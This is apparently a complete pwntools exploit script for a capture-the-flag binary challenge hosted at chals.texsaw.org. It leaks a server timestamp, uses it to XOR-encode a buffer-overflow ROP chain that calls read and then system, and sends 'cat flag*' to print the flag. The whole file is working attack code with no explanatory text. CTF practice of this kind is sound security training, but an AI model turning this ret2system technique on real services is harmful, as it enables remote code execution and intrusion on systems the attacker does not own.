from pwn import *

HOST, PORT = 'chals.texsaw.org', 3000
SYSTEM_PLT = 0x80490b0
READ_PLT   = 0x8049040
BSS_ADDR   = 0x0804c040
OFFSET     = 68

def encrypt(payload, server_t):
    enc = bytearray(len(payload))
    for i in range(len(payload)):
        k = ((server_t + i//4) >> ((i%4)*8)) & 0xff
        enc[i] = payload[i] ^ k
    return bytes(enc)

r = remote(HOST, PORT)
r.recvuntil(b'2026\n')
r.send(b'\x00' * 160)
server_t = u32(r.recv(40)[:4])
r.close()

rop = flat(b'A'*OFFSET, p32(READ_PLT), p32(SYSTEM_PLT),
           p32(0), p32(BSS_ADDR), p32(64), p32(0xdeadbeef), p32(BSS_ADDR))

r2 = remote(HOST, PORT)
r2.recvuntil(b'2026\n')
r2.send(encrypt(rop, server_t))
r2.recv(40)
r2.send(b'cat flag*\x00' + b'\x00'*54)
print(r2.recvall(timeout=4).decode())